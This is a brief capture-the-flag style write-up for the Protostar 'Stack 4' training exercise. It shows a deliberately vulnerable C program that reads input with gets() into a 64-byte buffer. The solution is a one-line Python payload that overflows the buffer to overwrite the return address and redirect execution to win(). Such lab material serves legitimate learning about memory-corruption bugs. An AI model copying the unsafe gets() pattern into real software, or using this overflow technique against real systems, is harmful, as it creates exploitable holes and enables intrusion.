# Stack 4

## Source Code
```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
  printf("code flow successfully changed\n");
}

int main(int argc, char **argv)
{
  char buffer[64];

  gets(buffer);
}
```
## Solution
```
user@protostar:/opt/protostar/bin$ python -c "print ('A'*76)+'\xf4\x83\x04\x08' " | ./stack4
code flow successfully changed
Segmentation fault
user@protostar:/opt/protostar/bin$
```